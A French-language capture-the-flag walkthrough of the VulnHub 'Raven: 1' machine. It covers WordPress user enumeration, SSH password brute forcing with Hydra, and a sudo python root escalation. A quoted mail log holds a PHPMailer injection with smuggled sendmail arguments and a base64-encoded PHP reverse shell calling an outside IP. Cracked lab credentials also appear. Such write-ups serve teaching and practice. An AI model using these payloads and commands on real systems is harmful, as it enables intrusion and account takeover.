---
title: "Solution du CTF Raven: 1 de VulnHub"
tags: [VulnHub, CTF]
---

Disons-le, le CTF [Raven](https://vulnhub.com/entry/raven-1,256/) n'était pas le plus excitant ni le plus intéressant qui soit.

Le shell initial est simple à avoir, mais il faut s'éloigner du scénario habituel et tester.

## Password reminder for dummies

Sur le port 80 on trouve un site avec une section blog portée par un Wordpress. Une énumération ne remonte pas de plugins vulnérables, mais deux utilisateurs :

```console
$ docker run --add-host raven.local:192.168.56.143 -it --rm wpscanteam/wpscan --url http://raven.local/wordpress/ -e ap,at,u --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
--- snip ---
[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://raven.local/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=4.8.7</generator>
 |  - http://raven.local/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8.7</generator>
--- snip ---
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://raven.local/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2023-03-20T19:29:00.000Z
 | Readme: http://raven.local/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://raven.local/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://raven.local/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://raven.local/wordpress/wp-content/plugins/akismet/readme.txt
--- snip ---
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] michael
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
--- snip ---
```

N'ayant rien de plus, je lance un brute force des comptes Wordpress :

```bash
docker run -v /tools/wordlists/:/data/ --add-host raven.local:192.168.56.143 -it --rm wpscanteam/wpscan --url http://raven.local/wordpress/ -U michael,steven -P /data/rockyou.txt
```

Ayant attendu un moment sans aucun résultat, je pourrais lancer une énumération web, mais le serveur est déjà bien chargé... Lançons à la place un brute force des comptes SSH.

```console
$ hydra -L /tmp/users.txt -P /tools/wordlists/rockyou.txt -e nsr ssh://192.168.56.143
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688768 login tries (l:2/p:14344384), ~1793048 tries per task
[DATA] attacking ssh://192.168.56.143:22/
[22][ssh] host: 192.168.56.143   login: michael   password: michael
```

Le password michael est trouvé immédiatement grâce à l'option `-e nsr` d'Hydra qui teste les comptes sans mots de passe et les mots de passe équivalents aux noms d'utilisateurs.

Lors de la connexion, on est accueilli par l'annonce d'un message. La boite mail est bien remplie :

```console
$ ssh michael@192.168.56.143
michael@192.168.56.143's password: 

You have new mail.
michael@Raven:~$ mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/michael": 25 messages 25 new
>N  1 MAILER-DAEMON@Rav  Mon Aug 13 08:04  130/6216  Postmaster notify: see transcript for details
 N  2 MAILER-DAEMON@Rav  Mon Aug 13 08:15  130/6259  Postmaster notify: see transcript for details
 N  3 MAILER-DAEMON@Rav  Mon Aug 13 08:16  130/6247  Postmaster notify: see transcript for details
 N  4 MAILER-DAEMON@Rav  Mon Aug 13 08:18  130/6237  Postmaster notify: see transcript for details
 N  5 MAILER-DAEMON@Rav  Mon Aug 13 08:19  130/6204  Postmaster notify: see transcript for details
 N  6 MAILER-DAEMON@Rav  Mon Aug 13 08:20  130/6287  Postmaster notify: see transcript for details
 N  7 MAILER-DAEMON@Rav  Mon Aug 13 08:41  130/6248  Postmaster notify: see transcript for details
 N  8 MAILER-DAEMON@Rav  Mon Aug 13 08:49  130/6242  Postmaster notify: see transcript for details
 N  9 MAILER-DAEMON@Rav  Mon Aug 13 12:19  130/6030  Postmaster notify: see transcript for details
 N 10 MAILER-DAEMON      Mon Aug 13 12:22   66/4044  Postmaster notify: see transcript for details
 N 11 MAILER-DAEMON      Mon Aug 13 12:22   66/4054  Postmaster notify: see transcript for details
 N 12 MAILER-DAEMON      Mon Aug 13 12:22   66/4054  Postmaster notify: see transcript for details
 N 13 MAILER-DAEMON      Mon Aug 13 12:22   66/4052  Postmaster notify: see transcript for details
 N 14 MAILER-DAEMON      Mon Aug 13 12:22   66/4058  Postmaster notify: see transcript for details
 N 15 MAILER-DAEMON      Mon Aug 13 12:22   66/4056  Postmaster notify: see transcript for details
 N 16 MAILER-DAEMON      Mon Aug 13 13:48   66/4052  Postmaster notify: see transcript for details
 N 17 MAILER-DAEMON      Mon Aug 13 13:48   66/4048  Postmaster notify: see transcript for details
 N 18 steven@Raven.rave  Mon Aug 13 14:16   17/751   *** SECURITY information for raven.local ***
 N 19 root@Raven.raven.  Mon Aug 13 14:33   23/851   Cron <root@Raven> service sendmail start
 N 20 MAILER-DAEMON@Rav  Mon Aug 13 14:33  130/5997  Postmaster notify: see transcript for details
 N 21 root@Raven.raven.  Mon Aug 13 17:26   23/851   Cron <root@Raven> service sendmail start
 N 22 MAILER-DAEMON      Wed Mar 29 04:01   67/3954  Postmaster notify: see transcript for details
 N 23 MAILER-DAEMON      Wed Mar 29 04:01   67/3972  Postmaster notify: see transcript for details
 N 24 MAILER-DAEMON      Wed Mar 29 04:01   61/2013  Postmaster notify: see transcript for details
 N 25 root@Raven.raven.  Wed Mar 29 04:01   23/851   Cron <root@Raven> service sendmail start
```

## Méthode alternative

Parmi ces messages, on trouve certains qui semblent correspondre à une exploitation via `PHPMailer`. Je vous invite à regarder ma solution du [CTF DonkeyDocker]({% link _posts/2022-01-13-Solution-du-CTF-DonkeyDocker-de-VulnHub.md %}) pour un cas d'exploitation :

```
--w7CM4ItF006746.1534111458/Raven.raven.local
Content-Type: message/rfc822

Return-Path: <XOHzC72qQ>
Received: (from www-data@localhost)
        by Raven.raven.local (8.14.4/8.14.4/Submit) id w7CM4ItE006746
        for xjmZ5"@BEDDT.com; Mon, 13 Aug 2018 08:04:18 +1000
X-Authentication-Warning: Raven.raven.local: www-data set sender to XOHzC72qQ\ using -f
X-Authentication-Warning: Raven.raven.local: Processed from queue /tmp
To: Hacker <admin@vulnerable.com>
Subject: Message from <?php eval(base64_decode('Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjA2LjEzMic7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7')); ?>
X-PHP-Originating-Script: 0:class.phpmailer.php
Date: Mon, 13 Aug 2018 08:04:18 +1000
From: Vulnerable Server <"XOHzC72qQ\" -OQueueDirectory=/tmp -X/var/www/html/JjpDMyXE.php xjmZ5"@BEDDT.com>
Message-ID: <6b351caa55de2b69dbc030a3093b065c@192.168.206.131>
X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1

qPWc


--w7CM4ItF006746.1534111458/Raven.raven.local--
```

En effet, dans le script `contact.php` on retrouve un appel à `PHPMailer` :

```php
<?php
if (isset($_REQUEST['action'])){
        $name=$_REQUEST['name'];
        $email=$_REQUEST['email'];
        $message=$_REQUEST['message'];
        if (($name=="")||($email=="")||($message=="")){
                echo "There are missing fields.";
        }else{
                require 'vendor/PHPMailerAutoload.php';
                $mail = new PHPMailer;
                $mail->Host = "localhost";
                $mail->setFrom($email, 'Vulnerable Server');
                $mail->addAddress('admin@vulnerable.com', 'Hacker');
                $mail->Subject  = "Message from $name";
                $mail->Body     = $message;
                if(!$mail->send()) {
                        echo 'Message was not sent.';
                        echo 'Mailer error: ' . $mail->ErrorInfo;
                } else {
                        echo 'Message has been sent.';
                }
        }
}
?>
```

## Simple as a Python shell

Je continue ma visite en récupérant les identifiants de la base de données dans la configuration du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Et je dump les hashes que je passe alors à JtR.

```console
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
2 rows in set (0.00 sec)
```

JtR trouve le password `pink84` pour steven. Cet utilisateur a aussi un compte Unix avec le même password. L'escalade de privilèges ne pose pas de problèmes :

```console
michael@Raven:/var/www/html/wordpress$ su steven
Password: 
$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)
$ sudo -l
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
$ sudo /usr/bin/python
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.setgid(0)
>>> import pty
>>> pty.spawn("/bin/bash")
root@Raven:/var/www/html/wordpress# id
uid=0(root) gid=0(root) groups=0(root)
root@Raven:/var/www/html/wordpress# cd /root
root@Raven:~# ls
flag4.txt
root@Raven:~# cat flag4.txt
______                      

| ___ \                     
| |_/ /__ ___   _____ _ __  
|    // _` \ \ / / _ \ '_ \ 
| |\ \ (_| |\ V /  __/ | | |
\_| \_\__,_| \_/ \___|_| |_|

                            
flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```
